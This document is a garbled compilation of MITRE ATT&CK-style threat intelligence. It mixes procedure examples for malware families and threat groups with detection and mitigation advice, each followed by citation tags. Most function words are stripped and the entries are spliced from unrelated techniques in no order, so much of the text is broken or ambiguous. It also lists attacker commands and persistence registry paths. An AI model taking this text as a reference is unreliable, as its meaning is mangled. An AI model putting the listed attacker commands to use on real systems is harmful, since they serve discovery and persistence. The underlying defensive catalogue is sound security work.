AQUATIC PANDA December 2021) [Pandora](https://attack.mitre.org/software/S0664) load additional drivers files victim machine.(Citation: Trend Micro Iron Tiger April 2021) [OSX_OCEANLOTUS.D](https://attack.mitre.org/software/S0352) encrypts strings RSA256 encodes custom base64 scheme XOR.(Citation: TrendMicro MacOS April 2018) [Crutch](https://attack.mitre.org/software/S0538) WinRAR utility compress encrypt stolen files.(Citation: ESET Crutch December 2020) (Citation: NCC TA505) [Chrommme](https://attack.mitre.org/software/S0667) enumerate IP address compromised host.(Citation: ESET Gelsemium June 2021)  Monitor failed authentication attempts accounts result password spraying attempts. difficult detect hashes cracked, scope target network. (ex: Windows EID 4625 5379) [QUADAGENT](https://attack.mitre.org/software/S0269) DNS C2 communications.(Citation: Unit 42 QUADAGENT July 2018) Monitor access tokens access services email created SAML tokens 1202 events “The Federation Service validated credential”) domain.(Citation: Sygnia Golden SAML) [Inception](https://attack.mitre.org/groups/G0100) encrypted malware payloads dropped victim machines AES RC4 encryption.(Citation: Kaspersky Cloud Atlas December 2014) (Citation: FireEye admin@338) [Epic](https://attack.mitre.org/software/S0091) <code>rem reg query</code> command values Registry keys.(Citation: Kaspersky Turla) [BlackTech](https://attack.mitre.org/groups/G0098) spearphishing e-mails links cloud services deliver malware.(Citation: TrendMicro BlackTech June 2017) infrastructure patterns malicious content SEO poisoning [Drive-by Target](https://attack.mitre.org/techniques/T1608/004) identified, internet scanning uncover adversary staged content supporting strategic compromise. activity visibility target organization, detection behavior difficult. Detection efforts focused phases adversary lifecycle, [Drive-by Compromise](https://attack.mitre.org/techniques/T1189) [Exploitation Client Execution](https://attack.mitre.org/techniques/T1203). [Kerrdown](https://attack.mitre.org/software/S0585) distributed e-mails malicious link.(Citation: Amnesty Intl. Ocean Lotus February 2021) Restrict user's abilities create Launch Agents policy. Monitor unusual login activity unknown abnormal locations, privileged accounts (ex: Exchange administrator account).  [Earth Lusca](https://attack.mitre.org/groups/G1006) established GitHub accounts host malware.(Citation: TrendMicro EarthLusca 2022) [CharmPower](https://attack.mitre.org/software/S0674) remove persistence-related artifacts Registry.(Citation: Check APT35 CharmPower January 2022) strings [USBStealer](https://attack.mitre.org/software/S0136) encrypted 3DES XOR reversed.(Citation: ESET Sednit USBStealer 2014) Monitoring Linux specific calls ptrace generate amounts data specialized nature, effective method detect common process injection methods.(Citation: ArtOfMemoryForensics) (Citation: GNU Acct) (Citation: RHEL auditd) (Citation: Chokepoint preload rootkits) [ShimRat](https://attack.mitre.org/software/S0444) download additional files.(Citation: FOX-IT 2016 Mofang) Monitor newly executed processes establish persistence elevate privileges executing malicious content triggered AppInit DLLs loaded processes. Monitor network data uncommon data flows. Processes utilizing network network communication suspicious. [Meteor](https://attack.mitre.org/software/S0688) `wmic.exe` effort delete shadow copies.(Citation: Check Meteor Aug 2021) [Orz](https://attack.mitre.org/software/S0229) gather victim drive information.(Citation: Proofpoint Leviathan Oct 2017) [SeaDuke](https://attack.mitre.org/software/S0053) capable executing commands.(Citation: Unit 42 SeaDuke 2015) [UNC2452](https://attack.mitre.org/groups/G0118) changed domain federation trust settings Azure administrative permissions configure domain accept authorization tokens signed SAML signing certificate.(Citation: 365 Defender Solorigate) process monitoring monitor execution command parameters binaries involved inhibiting recovery, vssadmin, wbadmin, bcdedit. [Winnti Windows](https://attack.mitre.org/software/S0141) Native API create process start services.(Citation: Novetta Winnti April 2015) [Wingbird](https://attack.mitre.org/software/S0176) drops malicious file (sspisrv.dll) lsass.exe, register service loads sspisrv.dll driver. payload malicious driver (located entry-point function) executed loaded lsass.exe spoofed service unstable crashes.(Citation: SIR 21)(Citation: Wingbird Nov 2017) [Attor](https://attack.mitre.org/software/S0438) plugin enumerates files specific extensions hard disk drives stores file encrypted log files.(Citation: ESET Attor Oct 2019) [Pupy](https://attack.mitre.org/software/S0192) built-in module port scanning.(Citation: GitHub Pupy) Ensure application component binaries signed correct application developers. [TrickBot](https://attack.mitre.org/software/S0266) gathers OS version, machine name, CPU type, RAM available, UEFI/BIOS firmware victim’s machine.(Citation: S2 Grupo TrickBot June 2017)(Citation: Fidelis TrickBot Oct 2016)(Citation: Cyberreason Anchor December 2019)(Citation: Eclypsium Trickboot December 2020) [Misdat](https://attack.mitre.org/software/S0083) saves file named `msdtc.exe`, legitimate Distributed Transaction Coordinator service binary.(Citation: Cylance Dust Storm)(Citation: DTC) [LightNeuron](https://attack.mitre.org/software/S0395) function delete files.(Citation: ESET LightNeuron 2019) [MoleNet](https://attack.mitre.org/software/S0553) collect system.(Citation: Cybereason Molerats Dec 2020) [Turla](https://attack.mitre.org/groups/G0010) frequently compromised WordPress sites C2 infrastructure.(Citation: Recorded Future Turla Infra 2020) (Citation: Symantec Suckfly March 2016)(Citation: Symantec Suckfly 2016) [BackConfig](https://attack.mitre.org/software/S0475) signed signed digital certificates mimicking legitimate software company.(Citation: Unit 42 BackConfig 2020) [CostaRicto](https://attack.mitre.org/campaigns/C0004), threat actors [PowerSploit](https://attack.mitre.org/software/S0194)'s `Invoke-ReflectivePEInjection` module.(Citation: BlackBerry CostaRicto November 2020) [TeamTNT](https://attack.mitre.org/groups/G0139) open-source tools Weave Scope target exposed Docker API ports gain initial access victim environments.(Citation: Intezer TeamTNT September 2020)(Citation: Cisco Talos Intelligence Group) [TeamTNT](https://attack.mitre.org/groups/G0139) targeted exposed kubelets Kubernetes environments.(Citation: Unit 42 Hildegard Malware) (Citation: Visa FIN6 Feb 2019) [YAHOYAH](https://attack.mitre.org/software/S0388) checks system’s Windows OS version hostname.(Citation: TrendMicro TropicTrooper 2015) [Revenge RAT](https://attack.mitre.org/software/S0379) gathers username system.(Citation: Cylance Shaheen Nov 2018) [Silence](https://attack.mitre.org/groups/G0091) port 444 sending data client server.(Citation: IB Silence Sept 2018)	 [Patchwork](https://attack.mitre.org/groups/G0040) Visual Basic Scripts (VBS) victim machines.(Citation: TrendMicro Patchwork Dec 2017)(Citation: Volexity Patchwork June 2018) Monitor windows registry values. enabling Registry Auditing specific produce alertable event (Event 4657) changed (though trigger values created Reghide evasive methods). (Citation: 4657 APR 2017) Registry entries load software Windows startup correlate software, patch cycles, etc., suspicious, additions files startup folder. include services modification existing binary paths malicious files. change service-related entry occurs, local remote service start restart execute file. [ifconfig](https://attack.mitre.org/software/S0101) display adapter configuration Unix systems, including TCP/IP, DNS, DHCP. [APT28](https://attack.mitre.org/groups/G0007) ntdsutil.exe utility export Active Directory database credential access.(Citation: Cybersecurity Advisory GRU Brute Force Campaign July 2021) [Zeus Panda](https://attack.mitre.org/software/S0330) hooks processes leveraging IAT hooked functions.(Citation: GDATA Zeus Panda June 2017) [Denis](https://attack.mitre.org/software/S0354) DNS tunneling C2 communications.(Citation: Cybereason Oceanlotus 2017)(Citation: Securelist Denis April 2017)(Citation: Cybereason Cobalt Kitty 2017) [SYSCON](https://attack.mitre.org/software/S0464) ability [Systeminfo](https://attack.mitre.org/software/S0096) identify information.(Citation: Unit 42 CARROTBAT January 2020) [HEXANE](https://attack.mitre.org/groups/G1001) [Ping](https://attack.mitre.org/software/S0097) `tracert` network discovery.(Citation: Kaspersky Lyceum October 2021) [Epic](https://attack.mitre.org/software/S0091) <code>tasklist /v</code> command list processes.(Citation: Kaspersky Turla)(Citation: Kaspersky Turla Aug 2014) [Darkhotel](https://attack.mitre.org/groups/G0012) searched anti-malware strings anti-virus processes running system.(Citation: Securelist Darkhotel Aug 2015)(Citation: DUBNIUM June 2016)  [Pony](https://attack.mitre.org/software/S0453) Windows functions purposes.(Citation: Malwarebytes Pony April 2016)	 [Mimikatz](https://attack.mitre.org/software/S0002) performs credential dumping account password gaining access additional systems enterprise network resources. functionality acquire credentials ways, including DCSync/NetSync.(Citation: Deply Mimikatz)(Citation: GitHub Mimikatz lsadump Module)(Citation: Directory Services Internals DPAPI Backup Oct 2015)(Citation: NCSC Joint Report Public Tools)(Citation: Cobalt Strike Manual 4.3 November 2020) [Chrommme](https://attack.mitre.org/software/S0667) encrypt store disk collected data exfiltration.(Citation: ESET Gelsemium June 2021) [Ke3chang](https://attack.mitre.org/groups/G0004) compromised credentials .NET tool dump data Exchange mailboxes.(Citation: NCC APT15 Alive Strong)(Citation: NICKEL December 2021) [FunnyDream](https://attack.mitre.org/campaigns/C0007) campaign, [FunnyDream](https://attack.mitre.org/software/S1044) backdoor execute multiple components exfiltrate files.(Citation: Bitdefender FunnyDream Campaign November 2020) Variants [Emissary](https://attack.mitre.org/software/S0082) encrypt payloads XOR ciphers, custom algorithm "srand" "rand" functions.(Citation: Lotus Blossom Dec 2015)(Citation: Emissary Trojan Feb 2016) [Unknown Logger](https://attack.mitre.org/software/S0130) victim name, physical memory, country, date.(Citation: Forcepoint Monsoon) [RunningRAT](https://attack.mitre.org/software/S0253) kills antimalware running process.(Citation: McAfee Gold Dragon) [RogueRobin](https://attack.mitre.org/software/S0270) WMI queries check sample running sandbox.(Citation: Unit 42 DarkHydrus July 2018)(Citation: Unit42 DarkHydrus Jan 2019) <code>net accounts</code> <code>net accounts /domain</code> commands [Net](https://attack.mitre.org/software/S0039) password policy information.(Citation: Savill 1999) [Cyclops Blink](https://attack.mitre.org/software/S0687) Linux API functions including execution discovery.(Citation: NCSC Cyclops Blink February 2022) [DRATzarus](https://attack.mitre.org/software/S0694) list users infected machine.(Citation: ClearSky Lazarus Aug 2020) (Citation: Symantec Leafminer July 2018) [ProLock](https://attack.mitre.org/software/S0654) remove files payload executed.(Citation: IB Ransomware September 2020) Monitor executed commands arguments steal data exfiltrating existing command control channel. [Magic Hound](https://attack.mitre.org/groups/G0059) malware capable keylogging.(Citation: Unit 42 Magic Hound Feb 2017) [Dridex](https://attack.mitre.org/software/S0384) encrypted traffic RC4.(Citation: Kaspersky Dridex 2017) [OilRig](https://attack.mitre.org/groups/G0049) credential dumping tool named VALUEVAULT steal credentials Windows Credential Manager.(Citation: FireEye APT34 July 2019) (Citation: F-Secure Dukes) technique easily mitigated preventive controls based behaviors performed scope enterprise defenses controls. Efforts focus minimizing sensitivity data external parties. [Bad Rabbit](https://attack.mitre.org/software/S0606) encrypted files disks AES-128-CBC RSA-2048.(Citation: Secure List Bad Rabbit) feature disabled terminal command: <code>defaults write -g ApplePersistence -bool no</code>. Disable SSH daemon systems require it. macOS ensure Remote Login disabled Sharing Preferences.(Citation: Apple Unified Log Analysis Remote Login Screen Sharing) [Vasport](https://attack.mitre.org/software/S0207) creates backdoor connection POST.(Citation: Symantec Vasport 2012) [ZeroT](https://attack.mitre.org/software/S0230) shellcode decrypts decompresses RC4-encrypted payload.(Citation: Proofpoint ZeroT Feb 2017) [AppleJeus](https://attack.mitre.org/software/S0584) decoded files received C2.(Citation: CISA AppleJeus Feb 2021) file access controls protect folders C:\Windows\System32. (Citation: Google EXOTIC LILY March 2022) 2017, [Sandworm Team](https://attack.mitre.org/groups/G0034) conducted technical vulnerabilities websites Korean Sport Olympic Committee, Korean power company, Korean airport.(Citation: District Court Indictment GRU Unit 74455 October 2020) Setting <code>timestamp_timeout</code> 0 require user input password time <code>sudo</code> executed. [Operation Honeybee](https://attack.mitre.org/campaigns/C0006), attackers created email addresses register account control server implants.(Citation: McAfee Honeybee)  Monitor anomalous file transfer activity accounts untrusted/unexpected VPCs. Monitor scheduled jobs attempt remove artifacts host system. network appliances host-based security software block network traffic environment, legacy protocols leveraged AiTM conditions. [Drovorub](https://attack.mitre.org/software/S0502) WebSocket protocol initiated communication C2 servers Upgrade request.(Citation: NSA/FBI Drovorub August 2020) [Cobalt Group](https://attack.mitre.org/groups/G0080) spearphishing emails attachment types corporate personal email accounts victim organizations. Attachment types included .rtf, .doc, .xls, archives LNK files, password protected archives .exe .scr executables.(Citation: Talos Cobalt July 2018)(Citation: PTSecurity Cobalt Aug 2017)(Citation: PTSecurity Cobalt Dec 2016)(Citation: IB Cobalt Aug 2017)(Citation: Proofpoint Cobalt June 2017)(Citation: RiskIQ Cobalt Nov 2017)(Citation: Unit 42 Cobalt Gang Oct 2018)(Citation: TrendMicro Cobalt Nov 2017) [Operation Wocao](https://attack.mitre.org/campaigns/C0014), threat actors ProcDump dump credentials memory.(Citation: FoxIT Wocao December 2019) Monitor logon sessions user accounts devices require MFA authentication. Monitor newly constructed registry creation task. Deletion values/keys registry malicious activity. [Bumblebee](https://attack.mitre.org/software/S1039) enumerate OS version domain targeted system.(Citation: Google EXOTIC LILY March 2022)(Citation: Proofpoint Bumblebee April 2022)(Citation: Symantec Bumblebee June 2022) [Stuxnet](https://attack.mitre.org/software/S0603) collects IP address compromised system.(Citation: Symantec W.32 Stuxnet Dossier) [StoneDrill](https://attack.mitre.org/software/S0380) anti-emulation techniques prevent automated analysis emulators sandboxes.(Citation: Kaspersky StoneDrill 2017)	 [Pisloader](https://attack.mitre.org/software/S0124) establishes persistence Registry key.(Citation: Palo Alto DNS Requests) Identify correct GPO permissions abuse opportunities (ex: GPO modification privileges) auditing tools [BloodHound](https://attack.mitre.org/software/S0521) (version 1.5.1 later)(Citation: GitHub Bloodhound). [SeaDuke](https://attack.mitre.org/software/S0053) samples module pass ticket Kerberos authentication.(Citation: Symantec Seaduke 2015) [KOCTOPUS](https://attack.mitre.org/software/S0669) distributed spearphishing emails malicious attachments.(Citation: MalwareBytes LazyScripter Feb 2021) process monitoring monitor execution arguments rundll32.exe. Compare invocations rundll32.exe prior history arguments loaded DLLs determine anomalous adversarial activity. (Citation: AhnLab Andariel Subgroup Lazarus June 2018) [Industroyer](https://attack.mitre.org/software/S0604) arbitrary service load boot persistence replaces ImagePath registry Windows service backdoor binary.(Citation: Dragos Crashoverride 2017)  [Aquatic Panda](https://attack.mitre.org/groups/G0143) deleted malicious executables compromised machines.(Citation: CrowdStrike AQUATIC PANDA December 2021) [Carberp](https://attack.mitre.org/software/S0484) installed bootkit maintain persistence.(Citation: ESET Carberp March 2012) [HAFNIUM](https://attack.mitre.org/groups/G0125) interacted Office 365 tenants gather details target's environments.(Citation: HAFNIUM March 2020) Monitor network data uncommon data flows. Processes utilizing network network communication suspicious. [ThiefQuest](https://attack.mitre.org/software/S0595) encrypts set file extensions host, deletes original files, ransom note contact information.(Citation: wardle evilquest partii) [TA505](https://attack.mitre.org/groups/G0092) tool EmailStealer steal send lists e-mail addresses remote server.(Citation: Trend Micro TA505 June 2019) [APT39](https://attack.mitre.org/groups/G0087) [CrackMapExec](https://attack.mitre.org/software/S0488) custom port scanner BLUETORCH network scanning.(Citation: FireEye APT39 Jan 2019)(Citation: BitDefender Chafer 2020) [MuddyWater](https://attack.mitre.org/groups/G0069) targeted spearphishing e-mails malicious links.(Citation: Anomali Static Kitten February 2021)(Citation: Trend Micro Muddy Water March 2021) [gh0st RAT](https://attack.mitre.org/software/S0032) load DLLs memory.(Citation: Gh0stRAT ATT March 2019) Monitor domain controller logs replication requests unscheduled activity DCSync.(Citation: DRSR Dec 2017) (Citation: GetNCCChanges) (Citation: Samba DRSUAPI) Note: Domain controllers log replication requests originating default domain controller account.(Citation: Harmj0y DCSync Sept 2015) (Citation: CrowdStrike Grim Spider 2019)(Citation: DHS/CISA Ransomware Targeting Healthcare October 2020)(Citation: Sophos Ryuk Attack October 2020)(Citation: CrowdStrike Wizard Spider October 2020) [Calisto](https://attack.mitre.org/software/S0274) adds .plist file /Library/LaunchAgents folder maintain persistence.(Citation: Securelist Calisto July 2018) [APT38](https://attack.mitre.org/groups/G0082) Hermes ransomware encrypt files AES256.(Citation: FireEye APT38 Oct 2018) [TURNEDUP](https://attack.mitre.org/software/S0199) capable injecting code APC queue created [Rundll32](https://attack.mitre.org/techniques/T1218/011) process "Early Bird injection."(Citation: CyberBit Bird Apr 2018) [Keydnap](https://attack.mitre.org/software/S0276) tor2web proxy HTTPS communications.(Citation: synack 2016 review) [Kessel](https://attack.mitre.org/software/S0487)'s configuration hardcoded RC4 encrypted binary.(Citation: ESET ForSSHe December 2018) [IronNetInjector](https://attack.mitre.org/software/S0581) IronPython scripts load payloads .NET injector.(Citation: Unit 42 IronNetInjector February 2021 ) [Transparent Tribe](https://attack.mitre.org/groups/G0134) websites malicious hyperlinks iframes infect targeted victims [Crimson](https://attack.mitre.org/software/S0115), [njRAT](https://attack.mitre.org/software/S0385), malicious tools.(Citation: Proofpoint Operation Transparent Tribe March 2016)(Citation: Unit 42 ProjectM March 2016)(Citation: Talos Transparent Tribe 2021) (Citation: MSTIC Nobelium Oct 2021) [Action RAT](https://attack.mitre.org/software/S1028) Base64 decode actor-controlled C2 server communications.(Citation: MalwareBytes SideCopy Dec 2021) Network intrusion detection prevention systems network signatures identify traffic specific adversary malware mitigate activity network level. [Ember Bear](https://attack.mitre.org/groups/G1003) spearphishing emails malicious attachments form PDFs, Word documents, JavaScript files, Control Panel File (CPL) executables.(Citation: Palo Alto Unit 42 OutSteel SaintBot February 2022 )  [Sibot](https://attack.mitre.org/software/S0589) queried registry proxy server information.(Citation: MSTIC NOBELIUM Mar 2021) [EvilBunny](https://attack.mitre.org/software/S0396) created Registry persistence <code>[HKLM|HKCU]\…\CurrentVersion\Run</code>.(Citation: Cyphort EvilBunny Dec 2014)	 Monitor Windows Task Scheduler stores %systemroot%\System32\Tasks change entries scheduled tasks correlate software, patch cycles, etc. [Impacket](https://attack.mitre.org/software/S0357) modules ntlmrelayx smbrelayx conjunction [Network Sniffing](https://attack.mitre.org/techniques/T1040) [LLMNR/NBT-NS Poisoning SMB Relay](https://attack.mitre.org/techniques/T1557/001) gather NetNTLM credentials [Brute Force](https://attack.mitre.org/techniques/T1110) relay attacks gain code execution.(Citation: Impacket Tools) [TrickBot](https://attack.mitre.org/software/S0266) identify user user belongs compromised host.(Citation: Cyberreason Anchor December 2019) Monitor contextual data named pipes system. [JSS Loader](https://attack.mitre.org/software/S0648) ability launch scheduled tasks establish persistence.(Citation: CrowdStrike Carbon Spider August 2021) [Lazarus Group](https://attack.mitre.org/groups/G0032) malware cmd.exe execute commands compromised host.(Citation: Novetta Blockbuster)(Citation: Novetta Blockbuster Destructive Malware)(Citation: McAfee Lazarus Resurfaces Feb 2018)(Citation: US-CERT SHARPKNOT June 2018)(Citation: Qualys LolZarus) Destover-like variant [Lazarus Group](https://attack.mitre.org/groups/G0032) batch file mechanism delete binaries system.(Citation: McAfee GhostSecret) (Citation: FireEye APT32 2017)(Citation: Cybereason Oceanlotus 2017)(Citation: Cybereason Cobalt Kitty 2017) [BRONZE BUTLER](https://attack.mitre.org/groups/G0060) downloads encoded payloads decodes victim.(Citation: Secureworks BRONZE BUTLER Oct 2017) [MechaFlounder](https://attack.mitre.org/software/S0459) ability send compromised user's account hostname URL C2.(Citation: Unit 42 MechaFlounder March 2019) [SMOKEDHAM](https://attack.mitre.org/software/S0649) encrypted C2 traffic RC4.(Citation: FireEye SMOKEDHAM June 2021) (Citation: POLONIUM June 2022) Monitor newly constructed files logging agents Kubernetes nodes retrieve logs sidecar proxies application resource pods monitor malicious container orchestration job deployments. [PowerStallion](https://attack.mitre.org/software/S0393) OneDrive C2 server network drive mapped <code>net use</code>.(Citation: ESET Turla PowerShell 2019) Limit domain admin account permissions domain controllers limited servers. Delegate admin functions separate accounts.(Citation: ADSecurity Kerberos Attacks) [Operation Wocao](https://attack.mitre.org/campaigns/C0014), threat actors password victim's password manager custom keylogger.(Citation: FoxIT Wocao December 2019) [BackdoorDiplomacy](https://attack.mitre.org/groups/G0135) obfuscated tools malware VMProtect.(Citation: ESET BackdoorDiplomacy Jun 2021) [TeamTNT](https://attack.mitre.org/groups/G0139) established tmate sessions C2 communications.(Citation: Unit 42 Hildegard Malware)(Citation: Cisco Talos Intelligence Group) [Kimsuky](https://attack.mitre.org/groups/G0094) collected Office, PDF, HWP documents victims.(Citation: Securelist Kimsuky Sept 2013)(Citation: Talos Kimsuky Nov 2021) (Citation: CrowdStrike SUNSPOT Implant January 2021) [SodaMaster](https://attack.mitre.org/software/S0627) ability download additional payloads C2 targeted system.(Citation: Securelist APT10 March 2021) [Leviathan](https://attack.mitre.org/groups/G0065) uploader LUNCHMONEY exfiltrate files Dropbox.(Citation: Proofpoint Leviathan Oct 2017)(Citation: FireEye Periscope March 2018) (Citation: Check Rocket Kitten) [BlackTech](https://attack.mitre.org/groups/G0098) e-mails malicious links lure victims installing malware.(Citation: TrendMicro BlackTech June 2017)	  [Mustang Panda](https://attack.mitre.org/groups/G0129) <code>ipconfig</code> <code>arp</code> determine network configuration information.(Citation: Avira Mustang Panda January 2020) (Citation: TrendMicro BlackTech June 2017)(Citation: JPCert PLEAD Downloader June 2018)(Citation: Trend Micro Waterbear December 2019)(Citation: Symantec Palmerworm Sep 2020) [Saint Bot](https://attack.mitre.org/software/S1018) `regsvr32` execute scripts.(Citation: Malwarebytes Saint Bot April 2021)(Citation: Palo Alto Unit 42 OutSteel SaintBot February 2022 ) [Dyre](https://attack.mitre.org/software/S0024) ability identify network settings compromised host.(Citation: Malwarebytes Dyreza November 2015) impact generated golden ticket, reset built-in KRBTGT account password twice, invalidate existing golden tickets created KRBTGT hash Kerberos tickets derived it. domain, change KRBTGT account password once, force replication, change password time. rotating KRBTGT account password 180 days.(Citation: STIG krbtgt reset) [LAPSUS$](https://attack.mitre.org/groups/G1004) gathered detailed target employees enhance social engineering lures.(Citation: MSTIC DEV-0537 Mar 2022) Monitor network data uncommon data flows. Processes utilizing network network communication suspicious. [Chimera](https://attack.mitre.org/groups/G0114) loading malicious DLLs memory.(Citation: NCC Chimera January 2021) [InvisiMole](https://attack.mitre.org/software/S0260) variations simple XOR encryption routine C&C communications.(Citation: ESET InvisiMole June 2018) [Olympic Destroyer](https://attack.mitre.org/software/S0365) API calls enumerate infected system's ARP table.(Citation: Talos Olympic Destroyer 2018) Monitor newly constructed services/daemons create modify system-level processes repeatedly execute malicious payloads persistence.  [CreepySnail](https://attack.mitre.org/software/S1024) stolen credentials authenticate target networks.(Citation: POLONIUM June 2022) [MailSniper](https://attack.mitre.org/software/S0413) searching email Exchange Office 365 environments.(Citation: GitHub MailSniper) [InnaputRAT](https://attack.mitre.org/software/S0259) launches execute commands victim’s machine.(Citation: ASERT InnaputRAT April 2018) [Grandoreiro](https://attack.mitre.org/software/S0531) VBScript execute malicious code.(Citation: Securelist Brazilian Banking Malware July 2020)(Citation: ESET Grandoreiro April 2020) [USBStealer](https://attack.mitre.org/software/S0136) searches victim drives files matching extensions (“.skr”,“.pkr” “.key”) names.(Citation: ESET Sednit USBStealer 2014)(Citation: Kaspersky Sofacy) [Operation Wocao](https://attack.mitre.org/campaigns/C0014), threat actors [netstat](https://attack.mitre.org/software/S0104) identify specific ports.(Citation: FoxIT Wocao December 2019) [SDBbot](https://attack.mitre.org/software/S0461) ability directory listings drive compromised host.(Citation: Proofpoint TA505 October 2019) [Patchwork](https://attack.mitre.org/groups/G0040) encrypted collected files' path AES encoded base64.(Citation: TrendMicro Patchwork Dec 2017) Inventory systems unauthorized Python installations. [KOCTOPUS](https://attack.mitre.org/software/S0669) deobfuscated executing commands.(Citation: MalwareBytes LazyScripter Feb 2021) [Koadic](https://attack.mitre.org/software/S0250) retrieve contents IP routing table Windows domain.(Citation: Github Koadic)(Citation: MalwareBytes LazyScripter Feb 2021) [Daserf](https://attack.mitre.org/software/S0187) execute commands.(Citation: Trend Micro Daserf Nov 2017)(Citation: Secureworks BRONZE BUTLER Oct 2017) [HermeticWiper](https://attack.mitre.org/software/S0697) ability set `HKLM:\SYSTEM\\CurrentControlSet\\Control\\CrashControl\CrashDumpEnabled` Registry key `0` disable crash dumps.(Citation: SentinelOne Hermetic Wiper February 2022)(Citation: Crowdstrike DriveSlayer February 2022)(Citation: Qualys Hermetic Wiper March 2022) [BITTER](https://attack.mitre.org/groups/G1002) downloaded additional malware tools compromised host.(Citation: Cisco Talos Bitter Bangladesh 2022)(Citation: Forcepoint BITTER Pakistan Oct 2016)  [ChChes](https://attack.mitre.org/software/S0144) communicates C2 server embeds data Cookie header.(Citation: Palo Alto menuPass Feb 2017)(Citation: JPCERT ChChes Feb 2017) [Raindrop](https://attack.mitre.org/software/S0565) encrypted payload simple XOR algorithm single-byte key.(Citation: Symantec RAINDROP January 2021)(Citation: Deep Dive Solorigate January 2021) [Empire](https://attack.mitre.org/software/S0363) capture webcam data Windows macOS systems.(Citation: Github PowerShell Empire) [Shark](https://attack.mitre.org/software/S1019)  download additional files C2 DNS.(Citation: ClearSky Siamesekitten August 2021)(Citation: Accenture Lyceum Targets November 2021) [TRITON](https://attack.mitre.org/software/S0609)’s TsLow python module pings controllers TriStation protocol.(Citation: FireEye TRITON 2017)  Uninstall VNC server software required. [RTM](https://attack.mitre.org/groups/G0048) distributed malware RIG SUNDOWN exploit kits, online advertising network <code>Yandex.Direct</code>.(Citation: ESET RTM Feb 2017)(Citation: ESET Buhtrap Buran April 2019) author [GravityRAT](https://attack.mitre.org/software/S0237) submitted samples VirusTotal testing, author modified code hide DDE object document.(Citation: Talos GravityRAT) [QakBot](https://attack.mitre.org/software/S0650) Regsvr32 execute malicious DLLs.(Citation: Red Canary Qbot)(Citation: Cyberint Qakbot 2021)(Citation: ATT QakBot April 2021) [WhisperGate](https://attack.mitre.org/software/S0689) overwrites MBR bootloader component performs destructive wiping operations hard drives displays fake ransom note host boots.(Citation: Crowdstrike WhisperGate January 2022)(Citation: Cybereason WhisperGate February 2022)(Citation: WhisperGate January 2022)(Citation: Cisco Ukraine Wipers January 2022)(Citation: Medium S2W WhisperGate January 2022) [Sandworm Team](https://attack.mitre.org/groups/G0034) intercepter-NG sniff passwords network traffic.(Citation: ESET Telebots Dec 2016)	 [Tomiris](https://attack.mitre.org/software/S0671) connected signalization server URL port, [Tomiris](https://attack.mitre.org/software/S0671) sends request URL establish C2.(Citation: Kaspersky Tomiris Sep 2021) [menuPass](https://attack.mitre.org/groups/G0045) scripts enumerate IP ranges victim network. [menuPass](https://attack.mitre.org/groups/G0045) issued command <code>net view /domain</code> [PlugX](https://attack.mitre.org/software/S0013) implant gather remote systems network.(Citation: PWC Cloud Hopper Technical Annex April 2017)(Citation: FireEye APT10 April 2017) Monitor network data uncommon data flows., usage abnormal/unexpected protocols. Monitor contextual data file, include name, content (ex: signature, headers, data/media), user/ower, permissions attempt hide artifacts behaviors evade detection. [PoetRAT](https://attack.mitre.org/software/S0428) exfiltrated data C2 channel.(Citation: Talos PoetRAT October 2020) [Tropic Trooper](https://attack.mitre.org/groups/G0081) installed service malicious DLL dropped disk.(Citation: PWC KeyBoys Feb 2017) [Kwampirs](https://attack.mitre.org/software/S0236) collects list domain command <code>net localgroup /domain</code>.(Citation: Symantec Orangeworm April 2018) [GravityRAT](https://attack.mitre.org/software/S0237) collects MAC address, name, CPU information.(Citation: Talos GravityRAT) [ShadowPad](https://attack.mitre.org/software/S0596) collected username victim system.(Citation: Kaspersky ShadowPad Aug 2017) [menuPass](https://attack.mitre.org/groups/G0045) modified version pentesting script wmiexec.vbs, logs remote machine WMI.(Citation: PWC Cloud Hopper Technical Annex April 2017)(Citation: Github AD-Pentest-Script)(Citation: Symantec Cicada November 2020) Monitor newly constructed files files named partial directories locations searched common processes environment variable, user writable. Also, monitor file creation programs named Windows programs programs commonly executed path (such "findstr," "net," "python"). activity occurs administration activity, upgrades, installations, patches, suspicious. [Ramsay](https://attack.mitre.org/software/S0458) scan network drives documents collection.(Citation: Eset Ramsay 2020)(Citation: Antiy CERT Ramsay April 2020)	 [PLAINTEE](https://attack.mitre.org/software/S0254) custom UDP protocol communicate.(Citation: Rancor Unit42 June 2018) [Agent Tesla](https://attack.mitre.org/software/S0331) inject known, vulnerable binaries targeted hosts.(Citation: SentinelLabs Agent Tesla Aug 2020)  [Denis](https://attack.mitre.org/software/S0354) command delete files victim’s machine.(Citation: Cybereason Oceanlotus 2017)(Citation: Cybereason Cobalt Kitty 2017) [Squirrelwaffle](https://attack.mitre.org/software/S1030) collect user compromised host.(Citation: ZScaler Squirrelwaffle Sep 2021) [Rising Sun](https://attack.mitre.org/software/S0448) delete files artifacts creates.(Citation: McAfee Sharpshooter December 2018)	 [XTunnel](https://attack.mitre.org/software/S0117) capable accessing locally stored passwords victims.(Citation: Invincea XTunnel) [CreepyDrive](https://attack.mitre.org/software/S1023) HTTPS C2 Graph API.(Citation: POLONIUM June 2022) Monitor DLL/PE file events, creation binary files loading DLLs processes. DLLs recognized loaded process. [APT19](https://attack.mitre.org/groups/G0073) malware variant establishes persistence setting Registry key <code>HKCU\Software\Microsoft\Windows\CurrentVersion\Run\Windows Debug Tools-%LOCALAPPDATA%\</code>.(Citation: Unit 42 C0d0so0 Jan 2016) [UNC2452](https://attack.mitre.org/groups/G0118) GoldFinder perform requests check internet connectivity identify proxy servers redirectors request travels through.(Citation: MSTIC NOBELIUM Mar 2021) [BendyBear](https://attack.mitre.org/software/S0574) decrypted function blocks XOR key runtime evade detection.(Citation: Unit42 BendyBear Feb 2021) [Moses Staff](https://attack.mitre.org/groups/G1009) batch scripts enable SMB compromised host.(Citation: Checkpoint MosesStaff Nov 2021) (Citation: Cylance Dust Storm) (Citation: CISA WellMail July 2020)(Citation: NCSC APT29 July 2020)(Citation: Cybersecurity Advisory SVR TTP 2021) [Chaes](https://attack.mitre.org/software/S0631) .MSI files initial start infection chain.(Citation: Cybereason Chaes Nov 2020) Monitor newly constructed network connections received untrusted hosts uncommon data flows. analyzing packet contents detect application layer protocols, leveraging SSL/TLS inspection encrypted traffic, follow expected protocol standards traffic flows(e.g. snmp traffic originating unauthorized untrusted hosts, signature detection strings mapped device configuration(s), anomolies snmp request(s)) [China Chopper](https://attack.mitre.org/software/S0020)'s server component perform brute force password guessing authentication portals.(Citation: FireEye Periscope March 2018) [Pteranodon](https://attack.mitre.org/software/S0147) capture screenshots configurable interval.(Citation: Palo Alto Gamaredon Feb 2017)(Citation: Unit 42 Gamaredon February 2022) 